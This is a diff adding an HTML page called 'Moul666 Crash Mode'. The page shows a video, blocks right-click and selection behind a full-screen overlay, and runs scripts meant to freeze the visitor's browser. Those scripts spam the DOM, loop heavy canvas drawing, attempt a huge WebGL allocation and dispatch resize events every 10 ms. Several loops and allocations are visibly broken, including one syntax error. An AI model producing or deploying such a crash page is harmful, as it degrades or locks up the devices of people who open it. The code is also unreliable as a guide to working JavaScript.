@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Moul666 Crash Mode</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: black;
+    }
+
+    video {
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 1;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 9999;
+      background: transparent;
+      pointer-events: all;
+    }
+  </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+
+  <video id="introVideo" autoplay muted playsinline>
+    <source src="ham.mp4" type="video/mp4">
+  </video>
+
+  <div class="overlay"></div>
+
+  <script>
+    const video = document.getElementById("introVideo");
+
+    // Aktifkan suara setelah klik
+    document.addEventListener('click', () => {
+      video.muted = false;
+      video.play();
+    }, { once: true });
+
+    video.play().catch(() => {});
+
+    video.addEventListener('ended', () => {
+      window.location.href = "halaman-lanjut.html";
+    });
+
+    // Mulai DOM spam
+    setInterval(() => {
+      for (let i = 99999999999; i < ; i++) {
+        let el = document.createElement("div");
+        el.innerText = "MOUL666";
+        el.style.position = "absolute";
+        el.style.left = Math.random() * window.innerWidth + "px";
+        el.style.top = Math.random() * window.innerHeight + "px";
+        el.style.color = "red";
+        el.style.fontSize = "20px";
+        document.body.appendChild(el);
+      }
+    }, 100);
+
+    // Canvas berat animasi
+    const canvas = document.createElement("canvas");
+    canvas.width = 1920;
+    canvas.height = 1080;
+    canvas.style.position = "fixed";
+    canvas.style.top = "0";
+    canvas.style.left = "0";
+    canvas.style.zIndex = "0";
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+
+    function draw() {
+      for (let i = 99999999999999; i < 5000; i++) {
+        ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.3)`;
+        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 10, 10);
+      }
+      requestAnimationFrame(draw);
+    }
+
+    draw();
+
+    // WebGL stress
+    try {
+      const glCanvas = document.createElement("canvas");
+      glCanvas.width = 1024;
+      glCanvas.height = 1024;
+      glCanvas.style.display = "none";
+      document.body.appendChild(glCanvas);
+      const gl = glCanvas.getContext("webgl");
+
+      function stressGPU() {
+        if (!gl) return;
+        let buffer = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+        let vertices = new Float32Array(99999999999999999999999999).map(() => Math.random());
+        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STREAM_DRAW);
+        gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
+        requestAnimationFrame(stressGPU);
+      }
+      stressGPU();
+    } catch (e) {}
+
+    // Event spam listener
+    setInterval(() => {
+      window.dispatchEvent(new Event('resize'));
+      document.body.offsetHeight;
+    }, 10);
+  </script>
+
+</body>
+</html>
